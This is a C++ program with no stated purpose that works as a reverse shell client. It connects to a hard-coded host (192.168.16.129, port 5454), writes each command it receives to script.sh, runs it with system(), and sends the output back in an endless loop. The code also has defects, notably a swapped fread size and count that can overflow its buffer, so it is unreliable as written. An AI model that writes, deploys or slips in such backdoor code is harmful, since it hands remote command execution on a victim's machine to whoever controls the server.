#include <iostream>
#include <cstring>
#include <sys/socket.h>

#include <arpa/inet.h>
#include <unistd.h>

#include <pthread.h>
#include <semaphore.h>

void connect(int &sock_fd) {
    struct sockaddr_in server_address;

    if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        std::cout << "Error: couldn't create socket\n";
    }

    memset(&server_address, 0, sizeof(server_address));
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(5454); 

    if(inet_pton(AF_INET, (char*)"192.168.16.129", &server_address.sin_addr) <= 0) {
        std::cout << "Error: inet_pton error\n";
    }

    if(connect(sock_fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        std::cout << "Error: connection\n";
        exit(-1);
    }

    else 
    {
        std::cout << "successfully connected to " << inet_ntoa(server_address.sin_addr) << "\n";
    }
}

void disconnect(int sock_fd) {
    close(sock_fd);
    std::cout << "connection closed\n";
}

void commands(int sock_fd) {

    while(true) {

        FILE *script = fopen("script.sh", "w");
        char buffer[1024];
        recv(sock_fd, buffer, 1024, 0);

        fwrite(buffer, sizeof(buffer), 1, script);

        fclose(script);
        
        system("chmod +x script.sh");
        system("./script.sh > output.txt");

        FILE *output = fopen("output.txt", "r");
        memset(buffer, 0, sizeof(buffer));
        fread(buffer, 1024, sizeof(buffer), output);
        fclose(output);
        send(sock_fd, buffer, 1024, 0);
    } 
}

int main(int argc, char* argv[]) {

    int sock_fd = 0; //socket descriptor
    connect(sock_fd); //connect to server

    commands(sock_fd);

    disconnect(sock_fd); //disconnects from server
    return 0;
}